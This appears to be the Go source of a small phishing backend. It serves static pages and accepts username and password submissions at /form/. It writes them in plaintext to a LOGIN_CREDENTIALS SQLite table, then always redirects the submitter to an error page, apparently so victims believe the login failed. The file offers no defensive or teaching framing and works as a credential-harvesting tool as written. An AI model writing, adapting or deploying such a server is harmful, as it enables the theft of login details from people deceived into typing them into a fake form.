package main

import (
	"context"
	"database/sql"
	"fmt"
	"log"
	"net/http"
	"os"

	_ "github.com/glebarez/go-sqlite"
)

var ddl string = `
	CREATE TABLE IF NOT EXISTS LOGIN_CREDENTIALS(
		username, password
	);
`

func main() {

	currCtx := context.Background()

	debug := os.Getenv("DEBUG")
	dbPath := os.Getenv("DB_PATH")

	if !all(debug, dbPath) {
		panic("bad env")
	}

	db, err := sql.Open("sqlite", dbPath)
	if err != nil {
		log.Fatal(err)
	}

	_, err = db.ExecContext(currCtx, ddl)
	if err != nil {
		panic(err)
	}

	// we will make nginx handle the static files in prod.
	if debug != "" {
		http.Handle("/", http.FileServer(http.Dir("static/")))
	}

	http.HandleFunc("POST /form/", func(w http.ResponseWriter, r *http.Request) {
		username := r.PostFormValue("username")
		password := r.PostFormValue("password")

		if username == "" || password == "" {
			fmt.Println("empty username password, early returning!")
			http.Redirect(w, r, "/error.html", http.StatusTemporaryRedirect)
			return
		}

		_, err := db.ExecContext(r.Context(), `INSERT INTO LOGIN_CREDENTIALS VALUES ( ?, ? )`, username, password)
		if err != nil {
			fmt.Println(err)
		}

		http.Redirect(w, r, "/error.html", http.StatusTemporaryRedirect)
		return
	})

	fmt.Println("Listening on :8080")

	err = http.ListenAndServe(":8080", nil)
	if err != nil {
		panic(err)
	}

}

func all(things ...string) bool {
	for _, thing := range things {
		if thing == "" {
			return false
		}
	}
	return true
}
